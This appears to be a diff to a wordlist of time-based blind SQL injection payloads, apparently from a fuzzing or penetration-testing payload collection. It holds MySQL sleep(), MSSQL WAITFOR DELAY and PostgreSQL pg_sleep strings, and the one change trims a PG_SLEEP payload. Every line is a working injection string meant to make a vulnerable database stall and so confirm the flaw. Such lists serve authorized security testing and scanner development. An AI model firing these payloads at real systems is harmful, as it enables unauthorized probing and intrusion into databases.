@@ -7,7 +7,7 @@ if(now()=sysdate(),sleep(10),0)
 1 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-1337
 1 or sleep(10)#
 ' WAITFOR DELAY '0:0:10'--
-7;SELECT PG_SLEEP(10)--
+;SELECT PG_SLEEP(10)--
 pg_sleep(10)
 '||pg_sleep(10)--
 '+(select*from(select(if(1=1,sleep(10),false)))a)+'
